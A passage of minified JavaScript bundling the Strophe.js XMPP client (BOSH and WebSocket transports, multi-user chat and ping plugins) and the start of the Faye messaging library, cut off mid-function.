e.Request(i.tree(),this._onRequestStateChange.bind(this,this._conn._dataRecv.bind(this._conn)),i.tree().getAttribute("rid")),this._requests.push(t),this._throttledRequestHandler()},_send:function(){clearTimeout(this._conn._idleTimeout),this._throttledRequestHandler(),this._conn._idleTimeout=setTimeout(function(){this._onIdle()}.bind(this._conn),100)},_sendRestart:function(){this._throttledRequestHandler(),clearTimeout(this._conn._idleTimeout)},_throttledRequestHandler:function(){this._requests?e.debug("_throttledRequestHandler called with "+this._requests.length+" requests"):e.debug("_throttledRequestHandler called with undefined requests"),this._requests&&0!==this._requests.length&&(0<this._requests.length&&this._processRequest(0),1<this._requests.length&&Math.abs(this._requests[0].rid-this._requests[1].rid)<this.window&&this._processRequest(1))}},e})),function(e,t){if("function"!=typeof define||!define.amd)return t(Strophe,$build);define("strophe-websocket",["strophe-core"],(function(e){return t(e.Strophe,e.$build)}))}(0,(function(e,t){return e.Websocket=function(e){this._conn=e,this.strip="wrapper";var t=e.service;if(0!==t.indexOf("ws:")&&0!==t.indexOf("wss:")){var i="";i="ws"===e.options.protocol&&"https:"!==window.location.protocol?i+"ws":i+"wss",i+="://"+window.location.host,i=0!==t.indexOf("/")?i+(window.location.pathname+t):i+t,e.service=i}},e.Websocket.prototype={_buildStream:function(){return t("open",{xmlns:e.NS.FRAMING,to:this._conn.domain,version:"1.0"})},_check_streamerror:function(t,i){if(0===(t=t.getElementsByTagNameNS?t.getElementsByTagNameNS(e.NS.STREAM,"error"):t.getElementsByTagName("stream:error")).length)return!1;for(var n=t[0],s=t="",o=0;o<n.childNodes.length;o++){var a=n.childNodes[o];if("urn:ietf:params:xml:ns:xmpp-streams"!==a.getAttribute("xmlns"))break;"text"===a.nodeName?s=a.textContent||a.text:t=a.nodeName}return n="WebSocket stream error: ",n=t?n+t:n+"unknown",s&&(n+=" - "+s),e.error(n),this._conn._changeConnectStatus(i,t),this._conn._doDisconnect(),!0},_reset:function(){},_connect:function(){this._closeSocket(),this.socket=new WebSocket(this._conn.service,"xmpp"),this.socket.onopen=this._onOpen.bind(this),this.socket.onerror=this._onError.bind(this),this.socket.onclose=this._onClose.bind(this),this.socket.onmessage=this._connect_cb_wrapper.bind(this)},_connect_cb:function(t){if(this._check_streamerror(t,e.Status.CONNFAIL))return e.Status.CONNFAIL},_handleStreamStart:function(t){var i=!1,n=t.getAttribute("xmlns");return"string"!=typeof n?i="Missing xmlns in <open />":n!==e.NS.FRAMING&&(i="Wrong xmlns in <open />: "+n),"string"!=typeof(t=t.getAttribute("version"))?i="Missing version in <open />":"1.0"!==t&&(i="Wrong version in <open />: "+t),!i||(this._conn._changeConnectStatus(e.Status.CONNFAIL,i),this._conn._doDisconnect(),!1)},_connect_cb_wrapper:function(t){if(0===t.data.indexOf("<open ")||0===t.data.indexOf("<?xml")){var i=t.data.replace(/^(<\?.*?\?>\s*)*/,"");""!==i&&(i=(new DOMParser).parseFromString(i,"text/xml").documentElement,this._conn.xmlInput(i),this._conn.rawInput(t.data),this._handleStreamStart(i)&&this._connect_cb(i))}else 0===t.data.indexOf("<close ")?(this._conn.rawInput(t.data),this._conn.xmlInput(t),(t=t.getAttribute("see-other-uri"))?(this._conn._changeConnectStatus(e.Status.REDIRECT,"Received see-other-uri, resetting connection"),this._conn.reset(),this._conn.service=t,this._connect()):(this._conn._changeConnectStatus(e.Status.CONNFAIL,"Received closing stream"),this._conn._doDisconnect())):(i=this._streamWrap(t.data),i=(new DOMParser).parseFromString(i,"text/xml").documentElement,this.socket.onmessage=this._onMessage.bind(this),this._conn._connect_cb(i,null,t.data))},_disconnect:function(i){if(this.socket&&this.socket.readyState!==WebSocket.CLOSED){i&&this._conn.send(i),i=t("close",{xmlns:e.NS.FRAMING}),this._conn.xmlOutput(i),i=e.serialize(i),this._conn.rawOutput(i);try{this.socket.send(i)}catch(t){e.info("Couldn't send <close /> tag.")}}this._conn._doDisconnect()},_doDisconnect:function(){e.info("WebSockets _doDisconnect was called"),this._closeSocket()},_streamWrap:function(e){return"<wrapper>"+e+"</wrapper>"},_closeSocket:function(){if(this.socket)try{this.socket.close()}catch(e){}this.socket=null},_emptyQueue:function(){return!0},_onClose:function(){this._conn._status!==e.Status.CONNECTING&&!this._conn.connected||this._conn.disconnecting?e.info("Websocket closed"):(e.error("Websocket closed unexpectedly"),this._conn._doDisconnect())},_no_auth_received:function(t){e.error("Server did not send any auth methods"),this._conn._changeConnectStatus(e.Status.CONNFAIL,"Server did not send any auth methods"),t&&(t=t.bind(this._conn))(),this._conn._doDisconnect()},_onDisconnectTimeout:function(){},_abortAllRequests:function(){},_onError:function(t){e.error("Websocket error "+t),this._conn._changeConnectStatus(e.Status.CONNFAIL,"The WebSocket connection could not be established or was disconnected."),this._disconnect()},_onIdle:function(){var t=this._conn._data;if(0<t.length&&!this._conn.paused){for(var i=0;i<t.length;i++)if(null!==t[i]){var n="restart"===t[i]?this._buildStream().tree():t[i],s=e.serialize(n);this._conn.xmlOutput(n),this._conn.rawOutput(s),this.socket.send(s)}this._conn._data=[]}},_onMessage:function(t){if('<close xmlns="urn:ietf:params:xml:ns:xmpp-framing" />'===t.data)this._conn.rawInput('<close xmlns="urn:ietf:params:xml:ns:xmpp-framing" />'),this._conn.xmlInput(t),this._conn.disconnecting||this._conn._doDisconnect();else{if(0===t.data.search("<open ")){var i=(new DOMParser).parseFromString(t.data,"text/xml").documentElement;if(!this._handleStreamStart(i))return}else i=this._streamWrap(t.data),i=(new DOMParser).parseFromString(i,"text/xml").documentElement;this._check_streamerror(i,e.Status.ERROR)||(this._conn.disconnecting&&"presence"===i.firstChild.nodeName&&"unavailable"===i.firstChild.getAttribute("type")?(this._conn.xmlInput(i),this._conn.rawInput(e.serialize(i))):this._conn._dataRecv(i,t.data))}},_onOpen:function(){e.info("Websocket open");var t=this._buildStream();this._conn.xmlOutput(t.tree()),t=e.serialize(t),this._conn.rawOutput(t),this.socket.send(t)},_reqToData:function(e){return e},_send:function(){this._conn.flush()},_sendRestart:function(){clearTimeout(this._conn._idleTimeout),this._conn._onIdle.bind(this._conn)()}},e})),"function"==typeof define&&define.amd&&define("strophe",["strophe-core","strophe-bosh","strophe-websocket"],(function(e){return e})),e){if("function"!=typeof define||!define.amd)return e(Strophe,$build,$msg,$iq,$pres);"function"==typeof requirejs?requirejs(["strophe"],(function(t){e(t.Strophe,t.$build,t.$msg,t.$iq,t.$pres)})):require(["strophe"],(function(t){e(t.Strophe,t.$build,t.$msg,t.$iq,t.$pres)}))}}((function(e,t,i,n,s){window.Strophe=e,window.$build=t,window.$msg=i,window.$iq=n,window.$pres=s}));var Occupant,RoomConfig,XmppRoom,hasProp={}.hasOwnProperty,bind=function(e,t){return function(){return e.apply(t,arguments)}};Strophe.addConnectionPlugin("muc",{_connection:null,rooms:{},roomNames:[],init:function(e){return this._connection=e,this._muc_handler=null,Strophe.addNamespace("MUC_OWNER",Strophe.NS.MUC+"#owner"),Strophe.addNamespace("MUC_ADMIN",Strophe.NS.MUC+"#admin"),Strophe.addNamespace("MUC_USER",Strophe.NS.MUC+"#user"),Strophe.addNamespace("MUC_ROOMCONF",Strophe.NS.MUC+"#roomconfig"),Strophe.addNamespace("MUC_REGISTER","jabber:iq:register")},join:function(e,t,i,n,s,o,a,r){var c=this.test_append_nick(e,t);return c=$pres({from:this._connection.jid,to:c}).c("x",{xmlns:Strophe.NS.MUC}),null!=a&&(c=c.c("history",a).up()),null!=o&&c.cnode(Strophe.xmlElement("password",[],o)),null!=r&&c.up().cnode(r),null==this._muc_handler&&(this._muc_handler=this._connection.addHandler(function(t){return function(i){var n,s,o=i.getAttribute("from");if(!o)return!0;if(o=o.split("/")[0],!t.rooms[o])return!0;if(e=t.rooms[o],o={},"message"===i.nodeName)o=e._message_handlers;else if("presence"===i.nodeName){var a=i.getElementsByTagName("x");if(0<a.length){var r=0;for(s=a.length;r<s;r++){var c=a[r];if((c=c.getAttribute("xmlns"))&&c.match(Strophe.NS.MUC)){o=e._presence_handlers;break}}}}for(n in o)(r=o[n])(i,e)||delete o[n];return!0}}(this))),this.rooms.hasOwnProperty(e)||(this.rooms[e]=new XmppRoom(this,e,t,o),n&&this.rooms[e].addHandler("presence",n),i&&this.rooms[e].addHandler("message",i),s&&this.rooms[e].addHandler("roster",s),this.roomNames.push(e)),this._connection.send(c)},leave:function(e,t,i,n){var s=this.roomNames.indexOf(e);return delete this.rooms[e],0<=s&&(this.roomNames.splice(s,1),0===this.roomNames.length&&(this._connection.deleteHandler(this._muc_handler),this._muc_handler=null)),t=this.test_append_nick(e,t),e=this._connection.getUniqueId(),t=$pres({type:"unavailable",id:e,from:this._connection.jid,to:t}),null!=n&&t.c("status",n),null!=i&&this._connection.addHandler(i,null,"presence",null,e),this._connection.send(t),e},message:function(e,t,i,n,s,o){return e=this.test_append_nick(e,t),s=s||(null!=t?"chat":"groupchat"),o=o||this._connection.getUniqueId(),(t=$msg({to:e,from:this._connection.jid,type:s,id:o}).c("body").t(i)).up(),null!=n&&(t.c("html",{xmlns:Strophe.NS.XHTML_IM}).c("body",{xmlns:Strophe.NS.XHTML}).h(n),0===t.node.childNodes.length?(n=t.node.parentNode,t.up().up(),t.node.removeChild(n)):t.up().up()),t.c("x",{xmlns:"jabber:x:event"}).c("composing"),this._connection.send(t),o},groupchat:function(e,t,i,n){return this.message(e,null,t,i,void 0,n)},invite:function(e,t,i){var n=this._connection.getUniqueId();return e=$msg({from:this._connection.jid,to:e,id:n}).c("x",{xmlns:Strophe.NS.MUC_USER}).c("invite",{to:t}),null!=i&&e.c("reason",i),this._connection.send(e),n},multipleInvites:function(e,t,i){var n,s=this._connection.getUniqueId(),o=$msg({from:this._connection.jid,to:e,id:s}).c("x",{xmlns:Strophe.NS.MUC_USER});for(e=0,n=t.length;e<n;e++){var a=t[e];o.c("invite",{to:a}),null!=i&&(o.c("reason",i),o.up()),o.up()}return this._connection.send(o),s},directInvite:function(e,t,i,n){var s=this._connection.getUniqueId();return e={xmlns:"jabber:x:conference",jid:e},null!=i&&(e.reason=i),null!=n&&(e.password=n),t=$msg({from:this._connection.jid,to:t,id:s}).c("x",e),this._connection.send(t),s},queryOccupants:function(e,t,i){var n={xmlns:Strophe.NS.DISCO_ITEMS};return e=$iq({from:this._connection.jid,to:e,type:"get"}).c("query",n),this._connection.sendIQ(e,t,i)},configure:function(e,t,i){return e=$iq({to:e,type:"get"}).c("query",{xmlns:Strophe.NS.MUC_OWNER}).tree(),this._connection.sendIQ(e,t,i)},cancelConfigure:function(e){return e=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_OWNER}).c("x",{xmlns:"jabber:x:data",type:"cancel"}).tree(),this._connection.sendIQ(e)},saveConfiguration:function(e,t,i,n){var s,o=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_OWNER});if(void 0!==Strophe.x&&void 0!==Strophe.x.Form&&t instanceof Strophe.x.Form)t.type="submit",o.cnode(t.toXML());else{o.c("x",{xmlns:"jabber:x:data",type:"submit"});var a=0;for(s=t.length;a<s;a++)e=t[a],o.cnode(e).up()}return t=o.tree(),this._connection.sendIQ(t,i,n)},createInstantRoom:function(e,t,i){return e=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_OWNER}).c("x",{xmlns:"jabber:x:data",type:"submit"}),this._connection.sendIQ(e.tree(),t,i)},createConfiguredRoom:function(e,t,i,n){var s;for(s in(e=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_OWNER}).c("x",{xmlns:"jabber:x:data",type:"submit"})).c("field",{var:"FORM_TYPE"}).c("value").t("http://jabber.org/protocol/muc#roomconfig").up().up(),t)if(hasProp.call(t,s)){var o=t[s];e.c("field",{var:s}).c("value").t(o).up().up()}return this._connection.sendIQ(e.tree(),i,n)},setTopic:function(e,t){return e=$msg({to:e,from:this._connection.jid,type:"groupchat"}).c("subject",{xmlns:"jabber:client"}).t(t),this._connection.send(e.tree())},_modifyPrivilege:function(e,t,i,n,s){return e=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_ADMIN}).cnode(t.node),null!=i&&e.c("reason",i),this._connection.sendIQ(e.tree(),n,s)},modifyRole:function(e,t,i,n,s,o){return t=$build("item",{nick:t,role:i}),this._modifyPrivilege(e,t,n,s,o)},kick:function(e,t,i,n,s){return this.modifyRole(e,t,"none",i,n,s)},voice:function(e,t,i,n,s){return this.modifyRole(e,t,"participant",i,n,s)},mute:function(e,t,i,n,s){return this.modifyRole(e,t,"visitor",i,n,s)},op:function(e,t,i,n,s){return this.modifyRole(e,t,"moderator",i,n,s)},deop:function(e,t,i,n,s){return this.modifyRole(e,t,"participant",i,n,s)},modifyAffiliation:function(e,t,i,n,s,o){return t=$build("item",{jid:t,affiliation:i}),this._modifyPrivilege(e,t,n,s,o)},ban:function(e,t,i,n,s){return this.modifyAffiliation(e,t,"outcast",i,n,s)},member:function(e,t,i,n,s){return this.modifyAffiliation(e,t,"member",i,n,s)},revoke:function(e,t,i,n,s){return this.modifyAffiliation(e,t,"none",i,n,s)},owner:function(e,t,i,n,s){return this.modifyAffiliation(e,t,"owner",i,n,s)},admin:function(e,t,i,n,s){return this.modifyAffiliation(e,t,"admin",i,n,s)},changeNick:function(e,t){return e=this.test_append_nick(e,t),e=$pres({from:this._connection.jid,to:e,id:this._connection.getUniqueId()}),this._connection.send(e.tree())},setStatus:function(e,t,i,n){return e=this.test_append_nick(e,t),e=$pres({from:this._connection.jid,to:e}),null!=i&&e.c("show",i).up(),null!=n&&e.c("status",n),this._connection.send(e.tree())},registrationRequest:function(e,t,i){return e=$iq({to:e,from:this._connection.jid,type:"get"}).c("query",{xmlns:Strophe.NS.MUC_REGISTER}),this._connection.sendIQ(e,(function(e){var i,n=e.getElementsByTagName("field"),s={required:[],optional:[]},o=0;for(i=n.length;o<i;o++){var a={var:(e=n[o]).getAttribute("var"),label:e.getAttribute("label"),type:e.getAttribute("type")};0<e.getElementsByTagName("required").length?s.required.push(a):s.optional.push(a)}return t(s)}),i)},submitRegistrationForm:function(e,t,i,n){var s;for(s in(e=$iq({to:e,type:"set"}).c("query",{xmlns:Strophe.NS.MUC_REGISTER})).c("x",{xmlns:"jabber:x:data",type:"submit"}),e.c("field",{var:"FORM_TYPE"}).c("value").t("http://jabber.org/protocol/muc#register").up().up(),t){var o=t[s];e.c("field",{var:s}).c("value").t(o).up().up()}return this._connection.sendIQ(e,i,n)},listRooms:function(e,t,i){return e=$iq({to:e,from:this._connection.jid,type:"get"}).c("query",{xmlns:Strophe.NS.DISCO_ITEMS}),this._connection.sendIQ(e,t,i)},test_append_nick:function(e,t){return Strophe.escapeNode(Strophe.getNodeFromJid(e))+"@"+(e=Strophe.getDomainFromJid(e))+(null!=t?"/"+t:"")}}),XmppRoom=function(){function e(e,t,i,n){this.client=e,this.name=t,this.nick=i,this.password=n,this._roomRosterHandler=bind(this._roomRosterHandler,this),this._addOccupant=bind(this._addOccupant,this),this.roster={},this._message_handlers={},this._presence_handlers={},this._roster_handlers={},this._handler_ids=0,this.client.muc&&(this.client=this.client.muc),this.name=Strophe.getBareJidFromJid(this.name),this.addHandler("presence",this._roomRosterHandler)}return e.prototype.join=function(e,t,i){return this.client.join(this.name,this.nick,e,t,i,this.password)},e.prototype.leave=function(e,t){return this.client.leave(this.name,this.nick,e,t),delete this.client.rooms[this.name]},e.prototype.message=function(e,t,i,n){return this.client.message(this.name,e,t,i,n)},e.prototype.groupchat=function(e,t){return this.client.groupchat(this.name,e,t)},e.prototype.invite=function(e,t){return this.client.invite(this.name,e,t)},e.prototype.multipleInvites=function(e,t){return this.client.invite(this.name,e,t)},e.prototype.directInvite=function(e,t){return this.client.directInvite(this.name,e,t,this.password)},e.prototype.configure=function(e){return this.client.configure(this.name,e)},e.prototype.cancelConfigure=function(){return this.client.cancelConfigure(this.name)},e.prototype.saveConfiguration=function(e){return this.client.saveConfiguration(this.name,e)},e.prototype.queryOccupants=function(e,t){return this.client.queryOccupants(this.name,e,t)},e.prototype.setTopic=function(e){return this.client.setTopic(this.name,e)},e.prototype.modifyRole=function(e,t,i,n,s){return this.client.modifyRole(this.name,e,t,i,n,s)},e.prototype.kick=function(e,t,i,n){return this.client.kick(this.name,e,t,i,n)},e.prototype.voice=function(e,t,i,n){return this.client.voice(this.name,e,t,i,n)},e.prototype.mute=function(e,t,i,n){return this.client.mute(this.name,e,t,i,n)},e.prototype.op=function(e,t,i,n){return this.client.op(this.name,e,t,i,n)},e.prototype.deop=function(e,t,i,n){return this.client.deop(this.name,e,t,i,n)},e.prototype.modifyAffiliation=function(e,t,i,n,s){return this.client.modifyAffiliation(this.name,e,t,i,n,s)},e.prototype.ban=function(e,t,i,n){return this.client.ban(this.name,e,t,i,n)},e.prototype.member=function(e,t,i,n){return this.client.member(this.name,e,t,i,n)},e.prototype.revoke=function(e,t,i,n){return this.client.revoke(this.name,e,t,i,n)},e.prototype.owner=function(e,t,i,n){return this.client.owner(this.name,e,t,i,n)},e.prototype.admin=function(e,t,i,n){return this.client.admin(this.name,e,t,i,n)},e.prototype.changeNick=function(e){return this.nick=e,this.client.changeNick(this.name,nick)},e.prototype.setStatus=function(e,t){return this.client.setStatus(this.name,this.nick,e,t)},e.prototype.addHandler=function(e,t){var i=this._handler_ids++;switch(e){case"presence":this._presence_handlers[i]=t;break;case"message":this._message_handlers[i]=t;break;case"roster":this._roster_handlers[i]=t;break;default:return this._handler_ids--,null}return i},e.prototype.removeHandler=function(e){return delete this._presence_handlers[e],delete this._message_handlers[e],delete this._roster_handlers[e]},e.prototype._addOccupant=function(e){return e=new Occupant(e,this),this.roster[e.nick]=e},e.prototype._roomRosterHandler=function(t){var i,n=(t=e._parsePresence(t)).nick,s=t.newnick||null;switch(t.type){case"error":return!0;case"unavailable":s&&(t.nick=s,this.roster[n]&&this.roster[s]&&(this.roster[n].update(this.roster[s]),this.roster[s]=this.roster[n]),this.roster[n]&&!this.roster[s]&&(this.roster[s]=this.roster[n].update(t))),delete this.roster[n];break;default:this.roster[n]?this.roster[n].update(t):this._addOccupant(t)}for(i in s=this._roster_handlers)(t=s[i])(this.roster,this)||delete this._roster_handlers[i];return!0},e._parsePresence=function(e){var t,i,n,s={};s.nick=Strophe.getResourceFromJid(e.getAttribute("from")),s.type=e.getAttribute("type"),s.states=[];var o=e.childNodes;for(e=0,t=o.length;e<t;e++){var a=o[e];switch(a.nodeName){case"error":s.errorcode=a.getAttribute("code"),s.error=null!=(n=a.childNodes[0])?n.nodeName:void 0;break;case"status":s.status=a.textContent||a.text||null;break;case"show":s.show=a.textContent||a.text||null;break;case"x":if(a.getAttribute("xmlns")===Strophe.NS.MUC_USER){var r=0;for(i=(n=a.childNodes).length;r<i;r++)switch(a=n[r],a.nodeName){case"item":s.affiliation=a.getAttribute("affiliation"),s.role=a.getAttribute("role"),s.jid=a.getAttribute("jid"),s.newnick=a.getAttribute("nick");break;case"status":a.getAttribute("code")&&s.states.push(a.getAttribute("code"))}}}}return s},e}(),RoomConfig=function(){function e(e){this.parse=bind(this.parse,this),null!=e&&this.parse(e)}return e.prototype.parse=function(e){var t,i,n=e.getElementsByTagName("query")[0].childNodes;for(this.identities=[],this.features=[],this.x=[],e=0,t=n.length;e<t;e++){var s=n[e],o=s.attributes;switch(s.nodeName){case"identity":var a={},r=0;for(i=o.length;r<i;r++)a[(s=o[r]).name]=s.textContent||s.text;this.identities.push(a);break;case"feature":this.features.push(s.getAttribute("var"));break;case"x":if("FORM_TYPE"!==!s.childNodes[0].getAttribute("var")&&"hidden"!==!s.childNodes[0].getAttribute("type"))for(r=s.childNodes,s=0,a=r.length;s<a;s++)(o=r[s]).attributes.type||this.x.push({var:o.getAttribute("var"),label:o.getAttribute("label")||"",value:o.firstChild.textContent||o.firstChild.text||""})}}return{identities:this.identities,features:this.features,x:this.x}},e}(),Occupant=function(){function e(e,t){this.room=t,this.update=bind(this.update,this),this.admin=bind(this.admin,this),this.owner=bind(this.owner,this),this.revoke=bind(this.revoke,this),this.member=bind(this.member,this),this.ban=bind(this.ban,this),this.modifyAffiliation=bind(this.modifyAffiliation,this),this.deop=bind(this.deop,this),this.op=bind(this.op,this),this.mute=bind(this.mute,this),this.voice=bind(this.voice,this),this.kick=bind(this.kick,this),this.modifyRole=bind(this.modifyRole,this),this.update(e)}return e.prototype.modifyRole=function(e,t,i,n){return this.room.modifyRole(this.nick,e,t,i,n)},e.prototype.kick=function(e,t,i){return this.room.kick(this.nick,e,t,i)},e.prototype.voice=function(e,t,i){return this.room.voice(this.nick,e,t,i)},e.prototype.mute=function(e,t,i){return this.room.mute(this.nick,e,t,i)},e.prototype.op=function(e,t,i){return this.room.op(this.nick,e,t,i)},e.prototype.deop=function(e,t,i){return this.room.deop(this.nick,e,t,i)},e.prototype.modifyAffiliation=function(e,t,i,n){return this.room.modifyAffiliation(this.jid,e,t,i,n)},e.prototype.ban=function(e,t,i){return this.room.ban(this.jid,e,t,i)},e.prototype.member=function(e,t,i){return this.room.member(this.jid,e,t,i)},e.prototype.revoke=function(e,t,i){return this.room.revoke(this.jid,e,t,i)},e.prototype.owner=function(e,t,i){return this.room.owner(this.jid,e,t,i)},e.prototype.admin=function(e,t,i){return this.room.admin(this.jid,e,t,i)},e.prototype.update=function(e){return this.nick=e.nick||null,this.affiliation=e.affiliation||null,this.role=e.role||null,this.jid=e.jid||null,this.status=e.status||null,this.show=e.show||null,this},e}(),Strophe.addConnectionPlugin("ping",{_c:null,init:function(e){this._c=e,Strophe.addNamespace("PING","urn:xmpp:ping")},ping:function(e,t,i,n){var s=this._c.getUniqueId("ping");e=$iq({type:"get",to:e,id:s}).c("ping",{xmlns:Strophe.NS.PING}),this._c.sendIQ(e,t,i,n)},pong:function(e){var t=e.getAttribute("from");e=e.getAttribute("id"),t=$iq({type:"result",to:t,id:e}),this._c.sendIQ(t)},addPingHandler:function(e){return this._c.addHandler(e,Strophe.NS.PING,"iq","get")}}),function(){var a={VERSION:"1.1.3",BAYEUX_VERSION:"1.0",ID_LENGTH:160,JSONP_CALLBACK:"jsonpcallback",CONNECTION_TYPES:"long-polling cross-origin-long-polling callback-polling websocket eventsource in-process".split(" "),MANDATORY_CONNECTION_TYPES:["long-polling","callback-polling","in-process"],ENV:"undefined"!=typeof window?window:global,extend:function(e,t,i){if(!t)return e;for(var n in t)t.hasOwnProperty(n)&&(e.hasOwnProperty(n)&&!1===i||e[n]!==t[n]&&(e[n]=t[n]));return e},random:function(e){e=e||this.ID_LENGTH;var t=Math.ceil(e*Math.log(2)/Math.log(36));for(e=csprng(e,36);e.length<t;)e="0"+e;return e},validateOptions:function(e,t){for(var i in e)if(0>this.indexOf(t,i))throw Error("Unrecognized option: "+i)},clientIdFromMessages:function(e){return(e=this.filter([].concat(e),(function(e){return"/meta/connect"===e.channel})))[0]&&e[0].clientId},copyObject:function(e){var t;if(e instanceof Array){var i=[];for(t=e.length;t--;)i[t]=a.copyObject(e[t]);return i}if("object"==typeof e){for(t in i=null===e?null:{},e)i[t]=a.copyObject(e[t]);return i}return e},commonElement:function(e,t){for(var i=0,n=e.length;i<n;i++)if(-1!==this.indexOf(t,e[i]))return e[i];return null},indexOf:function(e,t){if(e.indexOf)return e.indexOf(t);for(var i=0,n=e.length;i<n;i++)if(e[i]===t)return i;return-1},map:function(e,t,i){if(e.map)return e.map(t,i);var n=[];if(e instanceof Array)for(var s=0,o=e.length;s<o;s++)n.push(t.call(i||null,e[s],s));else for(s in e)e.hasOwnProperty(s)&&n.push(t.call(i||null,s,e[s]));return n},filter:function(e,t,i){if(e.filter)return e.filter(t,i);for(var n=[],s=0,o=e.length;s<o;s++)t.call(i||null,e[s],s)&&n.push(e[s]);return n},asyncEach:function(e,t,i,n){var s=e.length,o=-1,a=0,r=!1,c=function(){if(a+=1,!r){for(r=!0;0<a;)--a,(o+=1)===s?i&&i.call(n):t(e[o],c);r=!1}};c()},toJSON:function(e){return this.stringify?this.stringify(e,(function(e,t){return this[e]instanceof Array?this[e]:t})):JSON.stringify(e)}},b,c;"undefined"!=typeof module?module.exports=a:"undefined"!=typeof window&&(window.Faye=a),a.Class=function(e,t){"function"!=typeof e&&(t=e,e=Object);var i=function(){return this.initialize&&this.initialize.apply(this,arguments)||this},n=function(){};return n.prototype=e.prototype,i.prototype=new n,a.extend(i.prototype,t),i},b=a.EventEmitter=function(){},c="function"==typeof Array.isArray?Array.isArray:function(e){return"[object Array]"===Object.prototype.toString.call(e)},b.prototype.emit=function(e){if("error"===e&&(!this._events||!this._events.error||c(this._events.error)&&!this._events.error.length)){if(arguments[1]instanceof Error)throw arguments[1];throw Error("Uncaught, unspecified 'error' event.")}if(!this._events)return!1;var t=this._events[e];if(!t)return!1;if("function"==typeof t){switch(arguments.length){case 1:t.call(this);break;case 2:t.call(this,arguments[1]);break;case 3:t.call(this,arguments[1],arguments[2]);break;default:var i=Array.prototype.slice.call(arguments,1);t.apply(this,i)}return!0}if(c(t)){i=Array.prototype.slice.call(arguments,1);for(var n=0,s=(t=t.slice()).length;n<s;n++)t[n].apply(this,i);return!0}return!1},b.prototype.addListener=function(e,t){if("function"!=typeof t)throw Error("addListener only takes instances of Function");return this._events||(this._events={}),this.emit("newListener",e,t),this._events[e]?c(this._events[e])?this._events[e].push(t):this._events[e]=[this._events[e],t]:this._events[e]=t,this},b.prototype.on=b.prototype.addListener,b.prototype.once=function(e,t){var i=this;return i.on(e,(function n(){i.removeListener(e,n),t.apply(this,arguments)})),this},b.prototype.removeListener=function(e,t){if("function"!=typeof t)throw Error("removeListener only takes instances of Function");if(!this._events||!this._events[e])return this;var i=this._events[e];if(c(i)){e:if(i.indexOf)t=i.indexOf(t);else{for(var n=0;n<i.length;n++)if(t===i[n]){t=n;break e}t=-1}if(0>t)return this;i.splice(t,1),0==i.length&&delete this._events[e]}else this._events[e]===t&&delete this._events[e];return this},b.prototype.removeAllListeners=function(e){return 0===arguments.length?(this._events={},this):(e&&this._events&&this._events[e]&&(this._events[e]=null),this)},b.prototype.listeners=function(e){return this._events||(this._events={}),this._events[e]||(this._events[e]=[]),c(this._events[e])||(this._events[e]=[this._events[e]]),this._events[e]},a.Namespace=a.Class({initialize:function(){this._used={}},exists:function(e){return this._used.hasOwnProperty(e)},generate:function(){for(var e=a.random();this._used.hasOwnProperty(e);)e=a.random();return this._used[e]=e},release:function(e){delete this._used[e]}}),function(){var e=setTimeout,t="function"==typeof setImmediate?function(e){setImmediate(e)}:"object"==typeof process&&process.nextTick?function(e){process.nextTick(e)}:function(t){e(t,0)},i=function(e){return e},n=function(e){throw e},s=function(e){if(this._state=0,this._onFulfilled=[],this._onRejected=[],"function"==typeof e){var t=this;e((function(e){h(t,e)}),(function(e){u(t,e)}))}};s.prototype.then=function(e,t){var i=new s;return o(this,e,i),r(this,t,i),i};var o=function(e,t,n){"function"!=typeof t&&(t=i);var s=function(e){c(t,e,n)};0===e._state?e._onFulfilled.push(s):1===e._state&&s(e._value)},r=function(e,t,i){"function"!=typeof t&&(t=n);var s=function(e){c(t,e,i)};0===e._state?e._onRejected.push(s):2===e._state&&s(e._reason)},c=function(e,i,n){t((function(){e:{try{var t=e(i)}catch(e){u(n,e);break e}t===n?u(n,new TypeError("Recursive promise chain detected")):h(n,t)}}))},h=s.fulfill=s.resolve=function(e,t){var i=!1;try{var n=typeof t,s=null!==t&&("function"===n||"object"===n)&&t.then;if("function"!=typeof s)return d(e,t);s.call(t,(function(t){i^(i=!0)&&h(e,t)}),(function(t){i^(i=!0)&&u(e,t)}))}catch(t){i^(i=!0)&&u(e,t)}},d=function(e,t){if(0===e._state){e._state=1,e._value=t,e._onRejected=[],e=e._onFulfilled;for(var i;i=e.shift();)i(t)}},u=s.reject=function(e,t){if(0===e._state){e._state=2,e._reason=t,e._onFulfilled=[],e=e._onRejected;for(var i;i=e.shift();)i(t)}};s.all=function(e){return new s((function(t,i){var n,o=[],a=e.length;if(0===a)return t(o);for(n=0;n<a;n++)!function(e,n){s.fulfilled(e).then((function(e){o[n]=e,0==--a&&t(o)}),i)}(e[n],n)}))},s.defer=t,s.deferred=s.pending=function(){var e={};return e.promise=new s((function(t,i){e.fulfill=e.resolve=t,e.reject=i})),e},s.fulfilled=s.resolved=function(e){return new s((function(t,i){t(e)}))},s.rejected=function(e){return new s((function(t,i){i(e)}))},void 0===a?module.exports=s:a.Promise=s}(),a.Set=a.Class({initialize:function(){this._index={}},add:function(e){var t=void 0!==e.id?e.id:e;return!this._index.hasOwnProperty(t)&&(this._index[t]=e,!0)},forEach:function(e,t){for(var i in this._index)this._index.hasOwnProperty(i)&&e.call(t,this._index[i])},isEmpty:function(){for(var e in this._index)if(this._index.hasOwnProperty(e))return!1;return!0},member:function(e){for(var t in this._index)if(this._index[t]===e)return!0;return!1},remove:function(e){e=void 0!==e.id?e.id:e;var t=this._index[e];return delete this._index[e],t},toArray:function(){var e=[];return this.forEach((function(t){e.push(t)})),e}}),a.URI={isURI:function(e){return e&&e.protocol&&e.host&&e.path},isSameOrigin:function(e){var t=a.ENV.location;return e.protocol===t.protocol&&e.hostname===t.hostname&&e.port===t.port},parse:function(e){if("string"!=typeof e)return e;var t,i={},n=function(t,n){e=e.replace(n,(function(e){return 